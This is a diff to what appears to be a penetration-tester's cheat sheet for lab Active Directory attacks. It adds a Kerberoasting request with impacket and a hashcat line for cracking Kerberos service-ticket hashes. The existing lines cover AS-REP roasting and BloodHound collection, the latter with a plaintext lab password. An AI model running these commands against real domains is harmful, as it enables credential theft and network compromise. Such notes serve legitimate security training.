@@ -83,9 +83,14 @@ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast
 impacket-GetNPUsers -dc-ip 192.168.250.70 -request corp.com/ -usersfile usernames.txt
 GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
 
+
+# Kerberoast(requires valid credentials) 13100
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+
+
 ## hashcat
 hashcat -m 18200 ./hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
-
+hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 
 # bloodhound
 bloodhound-python --dns-tcp -ns 10.129.193.5 -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
